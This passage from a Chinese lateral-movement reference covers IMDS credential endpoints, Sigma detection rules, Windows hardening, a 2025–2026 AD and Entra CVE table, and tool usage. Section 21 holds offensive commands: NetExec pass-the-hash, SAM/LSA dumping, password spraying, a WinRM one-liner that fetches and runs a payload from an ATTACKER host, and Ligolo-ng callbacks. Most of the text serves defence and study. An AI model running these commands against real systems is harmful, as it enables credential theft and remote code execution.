> 本模式仅需记住「路由 + 一句判据」：

- **AWS**：IMDSv1/v2 端点 `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`；
  判据 = 目标 SSRF 点能否发起该内网地址请求并回显临时 AK/SK/Token（IMDSv2 需 `X-aws-ec2-metadata-token`）。
- **Azure**：`http://169.254.169.254/metadata/identity/oauth2/token`（需 `Metadata: true` 头）→ 托管标识 JWT。
- **GCP**：`http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`（需 `Metadata-Flavor: Google` 头）。
- 判据共同点：SSRF 能触达 169.254.169.254 且能回显 token → 属「SSRF→云凭据」链，交 cloud-k8s 展开评估，
  本模式只记录发现与路由，不重复铺开（避免跨生态重复建设）。

### 13. 检测规则集（Sigma / Event ID）

#### 13.1 Sigma 横向移动检测规则

```yaml
# ═══ Pass-the-Hash 检测 ═══
title: Possible Pass-the-Hash Activity
status: experimental
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 3
        AuthenticationPackageName: 'NTLM'
        TargetUserName|startswith: '$'  # 排除机器账户
    filter_legitimate:
        SubjectUserName|startswith: '$'
    condition: selection and not filter_legitimate
level: high
tags:
    - attack.lateral_movement
    - attack.t1550.002

---
# ═══ PsExec 检测 ═══
title: PsExec Service Installation
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7045
        ServiceName|contains: 'PSEXESVC'
    condition: selection
level: medium
tags:
    - attack.lateral_movement
    - attack.t1021.002

---
# ═══ WMI 远程执行检测 ═══
title: WMI Remote Process Creation
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        ParentImage|endswith: 'wmiprvse.exe'
    filter_system:
        ParentUser|contains: 'NT AUTHORITY'
    condition: selection and not filter_system
level: medium
tags:
    - attack.lateral_movement
    - attack.t1047

---
# ═══ RDP 劫持检测 ═══
title: RDP Session Hijack via tscon
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: 'tscon.exe'
        User|contains: 'NT AUTHORITY\SYSTEM'
    condition: selection
level: critical
tags:
    - attack.lateral_movement
    - attack.t1563.002

---
# ═══ DCOM 横向移动检测 ═══
title: DCOM Lateral Movement via MMC20
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        ParentImage|endswith: 'mmc.exe'
        ParentCommandLine|contains: '-Embedding'
    condition: selection
level: high
tags:
    - attack.lateral_movement
    - attack.t1021.003

---
# ═══ DNSAdmins 滥用检测 ═══
title: DNS ServerLevelPluginDll Modification
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4662
        Properties|contains: 'ServerLevelPluginDll'
    condition: selection
level: critical
tags:
    - attack.privilege_escalation
    - attack.t1543.003

---
# ═══ Cloud IMDS 探测检测 ═══
title: Instance Metadata Service Access
logsource:
    category: proxy
detection:
    selection:
        c-uri|contains: '169.254.169.254'
    condition: selection
level: high
tags:
    - attack.discovery
    - attack.t1580
```

#### 13.2 关键 Event ID 速查

| Event ID | 来源 | 含义 | 横向移动关联 |
|----------|------|------|-------------|
| 4624 | Security | 登录成功 | LogonType 3/10 判断远程类型 |
| 4625 | Security | 登录失败 | 暴力破解/撞库检测 |
| 4634 | Security | 注销 | 异常短会话检测 |
| 4648 | Security | 显式凭据登录 | RunAs / PsExec 特征 |
| 4672 | Security | 特权登录 | 管理员横向移动 |
| 4688 | Security | 进程创建 | WMI/WinRM 父进程检测 |
| 4697 | Security | 服务安装 | PsExec 服务创建 |
| 4768 | Security | TGT 请求 | Kerberos 异常检测 |
| 4769 | Security | TGS 请求 | SPN 扫描 / PtT 检测 |
| 4770 | Security | 票据使用 | 异常服务访问 |
| 5136 | Security | 目录对象修改 | DNS Admins / RBCD |
| 7045 | System | 服务创建 | PsExec / 恶意服务 |
| 7036 | System | 服务状态变化 | 服务启停监控 |
| 1 | Sysmon | 进程创建 | 父子进程异常关系 |
| 3 | Sysmon | 网络连接 | 横向移动端口监控 |
| 7 | Sysmon | 模块加载 | DLL 注入检测 |
| 10 | Sysmon | 进程访问 | 凭证窃取检测 |
| 17 | Sysmon | 管道创建 | PsExec 管道检测 |
| 18 | Sysmon | 管道连接 | PsExec 连接检测 |
| 257 | DNS Server | DNS 查询 | DNS 隧道 / exfil |

### 14. 防御措施（2025 最佳实践）

#### 14.1 LAPS（本地管理员密码解决方案）

```powershell
# ═══ 部署 LAPS ═══
# 1. 安装 LAPS
# Windows LAPS（已内置 Windows 10 22H2+）
# 或 Microsoft LAPS（旧版）

# 2. 配置 LAPS GPO
# Computer Configuration > Policies > Administrative Templates > LAPS
# - Password Settings: 复杂度, 长度(20+), 有效期(30天)
# - Backup Directory: 配置为 AD
# - Administrator Account Name: 自定义管理员名

# 3. 验证部署
Get-AdmPwdPassword -ComputerName TARGET

# 4. 使用 LAPS 密码横向移动（红队视角）
# 枚举有权限读取 LAPS 密码的用户
Find-LAPSDelegatedGroups
# 查找可重置 LAPS 密码的用户
Find-AdmPwdExtendedRights
# 读取 LAPS 密码
Get-AdmPwdPassword -ComputerName TARGET
```

#### 14.2 Tier Model（层级模型）

```
╔══════════════════════════════════════════════════════════╗
║                    Tier Model 分层                      ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  Tier 0: 域控制器 / CA / 企业管理员                       ║
║  ├── 严格限制: 仅 Tier 0 PAW 可登录                      ║
║  ├── 禁止: Tier 0 凭据登录 Tier 1/2 资源                  ║
║  └── 审计: 所有登录和变更                                 ║
║                                                          ║
║  Tier 1: 服务器 / 应用 / 数据库                           ║
║  ├── 限制: 仅 Tier 1 PAW 管理                            ║
║  ├── 禁止: Tier 1 凭据登录 Tier 2 资源                    ║
║  └── 网络分段: 仅允许必要端口                              ║
║                                                          ║
║  Tier 2: 工作站 / 用户设备                                ║
║  ├── 用户在 Tier 2 工作                                  ║
║  ├── 禁止: 从 Tier 2 直接管理 Tier 0/1                    ║
║  └── LAPS: 每台工作站独立本地管理员密码                    ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
```

#### 14.3 PAW（特权访问工作站）

```powershell
# ═══ PAW 配置 ═══
# 1. 专用管理工作站
#    - 全新安装的 Windows（无日常软件）
#    - 加入专用的 PAW OU
#    - 仅允许管理员登录

# 2. 网络隔离
#    - PAW 仅能访问 Tier 0/1 资源
#    - 禁止 PAW 访问互联网（白名单除外）
#    - 使用跳板机（Bastion）而非直接 RDP

# 3. 安全策略
#    - 启用 Credential Guard
#    - 启用 Remote Credential Guard
#    - 启用 Device Guard / WDAC
#    - 禁用 NTLM（尽可能）
#    - 强制 SMB 签名

# 4. 启用 Windows Defender Credential Guard
# GPO 或注册表
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f

# 5. 禁用 NTLM（分阶段）
# 阶段 1: 审计模式（记录但不阻止）
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel /t REG_DWORD /d 5 /f
# 阶段 2: 限制 NTLM（阻止入站）
# 阶段 3: 完全禁用 NTLM
```

#### 14.4 其他防御最佳实践

```bash
# ═══ 微分段 / 零信任网络 ═══
# 工作站到工作站: 默认拒绝
# 工作站到服务器: 白名单端口
# 服务器到服务器: 仅应用端口
# 所有管理流量通过 Bastion/Jump Server

# ═══ 凭证保护 ═══
# - Credential Guard (阻止 PtH)
# - Delegated Managed Service Accounts (gMSA/dMSA)
# - 禁用 WDigest（防止明文密码提取）
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 0 /f

# ═══ RDP 安全加固 ═══
# - 启用 NLA（Network Level Authentication）
# - 启用 Restricted Admin Mode（防止凭据传递到目标）
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
# - 启用 Remote Credential Guard
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdminOutboundCreds /t REG_DWORD /d 0 /f
# - RDP 仅通过 Bastion 访问
# - 启用 RDP Session 时间限制

# ═══ AD CS 加固 ═══
# - 审计所有证书模板权限
# - 移除低安全级别模板
# - CA 备份和监控
# - 限制证书注册权限
# - 启用 Certificate Transparency

# ═══ Kerberos 加固 ═══
# - AES256 加密强制
# - Kerberos Armoring (FAST)
# - 票据生命周期缩短（默认 10h → 建议 4h）
# - 监控 TGT 请求异常

# ═══ 日志与监控 ═══
# - 部署 Sysmon 并配置高级配置
# - 转发 Windows Event Log 到 SIEM
# - 启用 PowerShell Script Block Logging (Event ID 4104)
# - 启用命令行进程审计 (Event ID 4688)
# - 部署 EDR（CrowdStrike/SentinelOne/Defender for Endpoint）
# - 建立 NTLM 认证基线
# - 监控异常的 Kerberos 票据大小（>票据中包含 PAC 扩展）
```

### 15. 更新 MITRE ATT&CK 映射

| 战术 | 技术 ID | 技术名称 | 对应活动 |
|------|---------|----------|----------|
| 横向移动 | T1021.001 | Remote Desktop Protocol | RDP 横向 / PtH via RDP |
| 横向移动 | T1021.002 | SMB/Windows Admin Shares | PsExec/SMB 执行 |
| 横向移动 | T1021.003 | Distributed Component Object Model | DCOM 无文件横向 |
| 横向移动 | T1021.006 | Windows Remote Management | WinRM/PowerShell Remoting |
| 横向移动 | T1021.010 | Cloud API | Cloud VM 横向移动 |
| 横向移动 | T1047 | Windows Management Instrumentation | WMI 远程执行 |
| 横向移动 | T1059.001 | PowerShell | PowerShell Remoting/DCOM |
| 横向移动 | T1059.003 | Windows Command Shell | cmd.exe 远程执行 |
| 横向移动 | T1210 | Exploitation of Remote Services | 漏洞利用横向 |
| 横向移动 | T1534 | Internal Spearphishing | 内部钓鱼 |
| 横向移动 | T1563 | Remote Service Session Hijacking | RDP 劫持 |
| 横向移动 | T1563.002 | RDP Hijacking | tscon.exe 劫持 |
| 命令控制 | T1572 | Protocol Tunneling | SSH/Chisel/DNS 隧道 |
| 凭证访问 | T1550.001 | Application Access Token | Cloud Token 滥用 |
| 凭证访问 | T1550.002 | Pass the Hash | NTLM 哈希传递 |
| 凭证访问 | T1550.003 | Pass the Ticket | Kerberos 票据传递 |
| 凭证访问 | T1550.004 | Pass the Certificate | AD CS 证书传递 |
| 凭证访问 | T1549 | Steal or Forge Authentication Certificates | 证书窃取/伪造 |
| 凭证访问 | T1558 | Steal or Forge Kerberos Tickets | Kekeo/Rubeus 票据操作 |
| 凭证访问 | T1558.001 | Golden Ticket | 黄金票据攻击 |
| 凭证访问 | T1558.002 | Silver Ticket | 白银票据攻击 |
| 凭证访问 | T1558.003 | Kerberoasting | SPN 密码离线破解 |
| 防御规避 | T1090 | Proxy | 代理/跳板 |
| 防御规避 | T1090.001 | Internal Proxy | 内部代理 |
| 防御规避 | T1090.002 | External Proxy | 外部代理 |
| 提权 | T1543.003 | Windows Service | DNSAdmins 滥用 |
| 发现 | T1018 | Remote System Discovery | 内网主机发现 |
| 发现 | T1087.002 | Domain Account | 域用户枚举 |
| 发现 | T1482 | Domain Trust Discovery | 域信任关系发现 |
| 持久化 | T1547 | Boot or Logon Autostart | WMI 事件订阅持久化 |

---

## Part D：2025-2026 精细化补充

### 16. 2025-2026 关键横向移动 CVE 速查

| CVE | 年份 | CVSS | 影响 | 根因 | 补丁日期 |
|-----|------|------|------|------|---------|
| CVE-2025-53779 "BadSuccessor" | 2025 | High | dMSA→提权→全域横向 | dMSA 缺少权限检查 | 2025-08 |
| CVE-2025-53786 | 2025 | High | Exchange Hybrid→Entra ID 横向 | Exchange/SharePoint 模拟 | 2025-08 |
| CVE-2025-55241 | 2025 | 9.0 | Entra ID 跨租户 Actor Token | Token 格式混淆 | 2025-06 |
| CVE-2025-26647 | 2025 | High | Kerberos 输入验证→提权 | Kerberos 协议缺陷 | 2025-03 |
| CVE-2025-33073 | 2025 | High | NTLM 反射 SMB→提权 | NTLM 认证反射 | 2025-06 |
| CVE-2025-54918 | 2025 | 8.8 | NTLM LDAP 认证绕过→DCSync | LDAP 签名绕过 | 2025-07 |
| CVE-2026-25177 | 2026 | High | AD DS SPN/UPN→提权 | 资源名称限制不当 | 2026-03 |
| CVE-2025-29927 | 2025 | High | Next.js 中间件授权绕过 | x-middleware-subrequest | 2025-03 |

### 17. BadSuccessor (CVE-2025-53779) — dMSA 提权横向移动

#### 17.1 漏洞概述

BadSuccessor 是 Akamai 发现的 Windows Server 2025 新特性 **delegated Managed Service Account (dMSA)** 中的提权漏洞。默认配置下，攻击者可利用 dMSA 缺失的权限检查，从普通域用户提权至域管理员，进而全域横向移动。

- **发现者**: Akamai Security Research
- **影响**: 所有部署 Windows Server 2025 的 AD 环境（dMSA 默认启用）
- **可利用性**: 默认配置下极易利用
- **影响范围**: 截至 2025-06 尚未完全修复，Akamai 后续分析补丁仍有绕过可能

#### 17.2 攻击流程

```
┌──────────────────────────────────────────────────────────────┐
│  BadSuccessor 攻击链                                         │
├──────────────────────────────────────────────────────────────┤
│  1. 获取域用户凭证（钓鱼/口令喷洒/初始访问）                     │
│  2. 枚举 dMSA 配置（msDS-DelegatedMSAState 属性）             │
│  3. 修改目标 dMSA 的 KdsRootKey 属性（缺少权限检查）           │
│  4. 请求目标 dMSA 的 Kerberos 票据                            │
│  5. 使用高权限 dMSA 票据横向移动到域控制器                      │
│  6. DCSync → 全域接管                                        │
└──────────────────────────────────────────────────────────────┘
```

#### 17.3 检测与防御

```yaml
# Sigma 检测规则 — BadSuccessor dMSA 属性修改
title: Potential BadSuccessor dMSA Attribute Modification
status: experimental
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 5136
        AttributeLDAPDisplayName|contains:
            - 'msDS-DelegatedMSAState'
            - 'msDS-ManagedAccountPrecededByLink'
    condition: selection
level: critical
tags:
    - attack.privilege_escalation
    - attack.lateral_movement
    - attack.t1078
```

```bash
# 防御措施
# 1. 应用 2025-08 补丁（必要但不充分，需关注后续更新）
# 2. 审计 dMSA 创建权限
Get-ADObject -Filter {ObjectClass -eq 'msDS-DelegatedManagedServiceAccount'} -Properties *
# 3. 限制可创建/修改 dMSA 的用户/组
# 4. 监控 EventID 5136 对 dMSA 属性的修改
# 5. 评估是否真正需要 dMSA 功能，非必要则禁用
```

**关键参考**: [Akamai BadSuccessor 补丁分析](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch) | [Unit42 BadSuccessor 攻击向量](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/) | [Semperis 防御指南](https://semperis.com/blog/how-to-block-badsuccessor/) | [Tenable 指标](https://tenable.com/indicators/ioe/ad/C-BAD-SUCCESSOR)

### 18. AD→Entra ID 跨环境横向移动 (CVE-2025-53786)

#### 18.1 攻击概述

Dirk-jan Mollema 在 DEF CON 33 / Black Hat USA 2025 披露了一套完整的 **本地 AD → 云端 Entra ID** 横向移动技术。核心利用 Exchange/SharePoint 混合部署中的模拟（Impersonation）能力，从本地域用户跃升至云端全局管理员。

- **CVE**: CVE-2025-53786（2025-08-06 分配）
- **CISA 响应**: Emergency Directive ED 25-02
- **攻击前提**: Exchange Hybrid 部署 + 已获取域用户凭证
- **影响**: 完整的本地到云端横向移动链

#### 18.2 攻击链

```
┌──────────────────────────────────────────────────────────────────────┐
│  AD → Entra ID 横向移动链 (Mollema DC33)                            │
├──────────────────────────────────────────────────────────────────────┤
│  1. 获取本地 AD 域用户凭证                                           │
│  2. 利用 Exchange/SharePoint 模拟功能                                │
│     → 以其他用户身份发送邮件/访问资源                                 │
│  3. 通过 OAuth/App Consent 机制获取 Entra ID 令牌                    │
│  4. 利用 Entra ID 未文档化的认证流程                                  │
│  5. 提权至 Global Admin / Privileged Role Admin                     │
│  6. 全云端接管：Azure VM/Storage/M365/Intune                        │
└──────────────────────────────────────────────────────────────────────┘
```

#### 18.3 检测与防御

```bash
# 1. 确保已应用 CVE-2025-53786 补丁
# 2. 审计 Exchange Hybrid 配置
Get-HybridConfiguration | Format-List
# 3. 限制 Exchange Impersonation 权限
Get-ManagementRoleAssignment -Role "ApplicationImpersonation" | Format-Table
# 4. 监控 Entra ID 中异常的角色分配
Get-MgDirectoryRole | Where-Object {$_.DisplayName -match "Global Admin|Privileged Role"}
# 5. 部署 Entra ID Privileged Identity Management (PIM)
# 6. 启用 Entra ID Continuous Access Evaluation (CAE)
```

**关键参考**: [Mollema DC33 演讲 PDF](https://dirkjanm.io/assets/raw/dirkjan%20-%20DC33%20-%20Advanced%20Active%20Directory%20to%20Entra%20ID%20lateral%20movement%20techniques_final.pdf) | [CISA ED 25-02](https://www.cisa.gov/news-events/directives/ed-25-02-mitigate-microsoft-exchange-vulnerability) | [CERT-EU 公告](https://cert.europa.eu/publications/security-advisories/2025-030/) | [The Hacker News 报道](https://thehackernews.com/2025/09/microsoft-patches-critical-entra-id.html)

### 19. CVE-2026-25177 — AD DS SPN/UPN 提权

#### 19.1 漏洞概述

2026 年 3 月 Patch Tuesday 修复的 AD DS 提权漏洞。根因是 Active Directory 对 **SPN（Service Principal Name）** 和 **UPN（User Principal Name）** 的资源名称限制不当，允许已认证攻击者通过网络提权。

| 字段 | 详情 |
|------|------|
| CVE | CVE-2026-25177 |
| 严重性 | High |
| 影响产品 | Active Directory Domain Services |
| 根因 | SPN/UPN 资源名称限制不当 |
| 攻击向量 | 网络（需已认证） |
| 补丁日期 | 2026-03-10 |

#### 19.2 横向移动影响

```
攻击者利用路径:
1. 已获取域用户凭证（通过初始访问/钓鱼）
2. 利用 SPN/UPN 验证缺陷 → 构造特权 SPN
3. 绕过 Kerberos 服务票据验证
4. 以高权限服务账户身份横向移动
5. 横移到域控制器 → 全域接管
```

```bash
# 检测脚本
# 检查是否已安装补丁
wmic qfe list | findstr "KB_NUMBER"
# 或 PowerShell
Get-HotFix | Where-Object {$_.InstalledOn -gt (Get-Date "2026-03-10")}

# 缓解措施（补丁前）
# 1. 严格审计 SPN 注册
setspn -Q */*
# 2. 限制普通用户的 SPN 写入权限
# 3. 启用 ADCS 审计（EventID 5136）
# 4. 部署 LAPS + Tier Model
```

**关键参考**: [Penligent 深度分析](https://www.penligent.ai/hackinglabs/cve-2026-25177-active-directory-privilege-escalation-and-the-hidden-risk-in-spn-and-upn-validation/) | [1898 Advisories](https://1898advisories.burnsmcd.com/active-directory-domain-services-elevation-of-privilege-vulnerability) | [Rapid7](https://www.rapid7.com/db/vulnerabilities/microsoft-windows-cve-2026-25177/)

### 20. AI 驱动的自主横向移动

#### 20.1 威胁态势

2025-2026 年，AI/自主代理对横向移动的影响：

| 趋势 | 详情 | 来源 |
|------|------|------|
| AI 自主攻击链 | 漏洞发现→利用→横向移动→协调，全链自主化 | 趋势科技 2026 预测 |
| 未管理资产成为首选目标 | 2025 年 20%+ 新利用漏洞针对网络基础设施，2026 年预计超 30% | CDNetworks 统计 |
| 凭证滥用仍为主流 | 凭证窃取和滥用是横向移动核心手段 | Unit 42 IR 报告 |
| 多云自主攻击链 | 跨 AWS/Azure/GCP 的自主横向移动 | 新华网 20 项威胁 |
| AI 压缩攻击周期 | 从获取访问到产生影响的时间大幅缩短 | Unit 42 / Gartner |

#### 20.2 防御 AI 横向移动

```bash
# 1. 部署 AI 驱动的检测（行为分析而非签名）
#    - CrowdStrike AI Agent Detection
#    - SentinelOne Purple AI
#    - Microsoft Security Copilot

# 2. 零信任网络分段（阻止自动横向移动）
#    - 微分段：工作站→工作站默认拒绝
#    - 身份感知策略：基于用户/设备/行为的动态访问控制
#    - 持续验证：不信任任何内部连接

# 3. 凭证生命周期管理
#    - 自动轮换（LAPS/gMSA/dMSA + 补丁）
#    - 实时凭证泄露检测（CrowdStrike/Defender）
#    - 最小权限原则（JIT/JEA/PIM）

# 4. 横向移动路径映射与消除
#    - BloodHound CE → 识别攻击路径
#    - 定期运行攻击面评估
#    - 消除 Tier 违规（Tier 0 凭证登录 Tier 2 = 立即修复）
```

**关键参考**: [趋势科技 2026 预测](https://www.secrss.com/articles/85962) | [CDNetworks 统计](https://www.cdnetworks.com/cn/blog/cloud-security/cybersecurity-statistics-and-trends-2026/) | [Unit 42 IR 报告](https://www.paloaltonetworks.cn/resources/research/unit-42-incident-response-report) | [Gartner 2026 趋势](https://www.gartner.com/cn/newsroom/press-releases/2026-top-cybersecurity-trends)

### 21. 工具生态更新（2025-2026）

#### 21.1 NetExec（原 CrackMapExec）

CrackMapExec 已停止维护，**NetExec (nxc)** 是官方继任者，活跃维护中。

```bash
# NetExec 安装
pip install netexec

# 横向移动核心命令
# SMB 执行
nxc smb TARGETS -u admin -p password -x "whoami"
nxc smb TARGETS -u admin -H NTLM_HASH --exec-method wmiexec -x "whoami"

# WinRM 执行
nxc winrm TARGETS -u admin -H NTLM_HASH -x "whoami"
nxc winrm TARGETS -u admin -p password -X "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')"

# SSH 横向移动
nxc ssh TARGETS -u root -p password -x "id"

# 密码喷洒
nxc smb TARGETS -u users.txt -p passwords.txt --no-bruteforce

# 凭证传递
nxc smb TARGETS -u admin -H NTLM_HASH --shares
nxc smb TARGETS -u admin -H NTLM_HASH --sam
nxc smb TARGETS -u admin -H NTLM_HASH --lsa

#BloodHound CE 集成
nxc ldap TARGETS -u user -p password --bloodhound --collection All
```

#### 21.2 BloodHound CE v8

BloodHound Community Edition v8 引入 OpenGraph 架构，支持跨平台攻击路径分析。

```bash
# 安装 BloodHound CE
docker compose up -d

# 数据采集（NetExec）
nxc ldap DC_IP -u user -p password --bloodhound --collection All

# 数据采集（SharpHound）
SharpHound.exe --collectionmethods All --domain domain.com

# 关键新功能
# - OpenGraph 架构：支持任意平台攻击路径
# - ADCS 边类型增强：ESC1-ESC16 完整映射
# - Scentry 服务：持续监控攻击路径变化
# - Azure/Entra ID 边类型：混合环境攻击路径
# - 自定义查询：Gremlin 查询语言
```

#### 21.3 Ligolo-ng 更新

```bash
# Ligolo-ng 2025-2026 增强
# 支持多隧道、自动路由、TUN 模式
./proxy -selfcert -laddr 0.0.0.0:11601

# 目标端
./agent -connect ATTACKER:11601 -ignore-cert -retry

# 控制台操作
# 查看会话
session
# 切换到指定会话
session 1
# 添加路由
ifadd --name tunnel1 --addr 10.10.10.1/24
# 启动监听器（反向连接）
listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8080
```

#### 21.4 工具对比矩阵更新

| 工具 | 版本 | 协议 | 加密 | 跨平台 | 2025-2026 新特性 |
|------|------|------|------|--------|----------------|
| NetExec | 1.3+ | SMB/WinRM/SSH/LDAP/MSSQL | 可 | 是 | 多协议横向移动、BloodHound CE 集成 |
| BloodHound CE | 8.0+ | 图数据库 | 可 | 是 | OpenGraph、ADCS 边、Entra ID 边、Scentry |
| Ligolo-ng | 0.7+ | TCP/TLS | 是 | 是 | 多隧道、自动路由、TUN 模式 |
| Chisel | 1.10+ | TCP/HTTP | 是 | 是 | HTTP/2 支持、性能优化 |
| Evil-WinRM | 3.x | WinRM | 是 | 否 | AMSI 绕过增强、DLL 注入 |
| Certipy | 4.8+ | LDAP/Kerberos | 是 | 是 | ESC13-ESC16、Shadow Credentials、dMSA |

### 22. 中文社区精华参考

| 来源 | 关键内容 | 链接 |
|------|---------|------|
| 奇安信 | 2025 网络安全态势分析、2026 趋势展望 | [奇安信](https://www.qianxin.com/chuangkehui/activity/news/details?id=14563) |
| 安全内参 | AI 驱动自主攻击链含横向移动 | [安全内参](https://www.secrss.com/articles/85962) |
| 新华网 | 2026 年 20 项网络威胁 | [新华网](http://www.news.cn/liangzi/20260122/0f4329fef6ab407b8087b81916d67ada/c.html) |
| IBM 中国 | 横向移动定义与防御框架 | [IBM](https://www.ibm.com/cn-zh/think/topics/lateral-movement) |
| Unit 42 中文 | 2026 全球事件响应报告 | [Palo Alto](https://www.paloaltonetworks.cn/resources/research/unit-42-incident-response-report) |
| Gartner 中文 | 2026 网络安全重要趋势 | [Gartner](https://www.gartner.com/cn/newsroom/press-releases/2026-top-cybersecurity-trends) |
| CDNetworks | 2026 安全统计与趋势 | [CDNetworks](https://www.cdnetworks.com/cn/blog/cloud-security/cybersecurity-statistics-and-trends-2026/) |

### 23. 防御升级路线图（P0-P3）

| 优先级 | 动作 | 时间线 | 验证方法 |
|--------|------|--------|---------|
| **P0** | 应用 CVE-2025-53779/53786/26647/33073/54918/25177 补丁 | 立即 | `Get-HotFix` 确认 KB 编号 |
| **P0** | 启用 SMB 签名（防止 NTLM 中继） | 1周 | `Get-SmbServerConfiguration` 验证 |
| **P0** | 部署 Credential Guard + 禁用 WDigest | 2周 | 注册表验证 + VBS 状态检查 |
| **P1** | 部署 LAPS / Tier Model / 微分段 | 1月 | BloodHound CE 验证攻击路径减少 |
| **P1** | 部署 EDR + AI 行为检测 | 1月 | 模拟横向移动测试检测率 |
| **P1** | 启用 LDAP 签名 + Channel Binding | 2周 | `ldp.exe` 测试绑定行为 |
| **P2** | 部署 BloodHound CE 持续监控 | 2月 | 定期攻击路径审计报告 |
| **P2** | Kerberos AES256 强制 + FAST | 2月 | `klist` 验证加密类型 |
| **P2** | Exchange Hybrid 安全审计 | 2月 | Impersonation 权限列表审查 |
| **P3** | AI 驱动横向移动检测 | 3月 | 红队演练验证 |
| **P3** | Entra ID PIM + CAE | 3月 | 监控异常角色激活 |
| **P3** | AD CS 证书模板全面审计 | 3月 | Certipy find 验证 |
